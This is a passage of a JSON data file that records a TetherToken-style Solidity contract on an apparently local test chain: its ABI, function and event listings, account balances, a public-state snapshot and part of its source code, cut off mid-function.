deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "TetherToken",\n      "address": "0xA94B7f0465E98609391C623d0560C5720a3f2D33",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "name",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "name": "deprecate",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "approve",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "deprecated",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "name": "addBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transferFrom",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "upgradedAddress",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "balances",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "decimals",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "maximumFee",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "_totalSupply",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "name": "getBlackListStatus",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "allowed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "name": "balanceOf",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xA94B7f0465E98609391C623d0560C5720a3f2D33": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99744397880000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "test",\n        "deprecated": false,\n        "totalSupply": 1,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 1,\n        "maximumFee": 10,\n        "_totalSupply": 1,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "test",\n        "basisPointsRate": 1,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        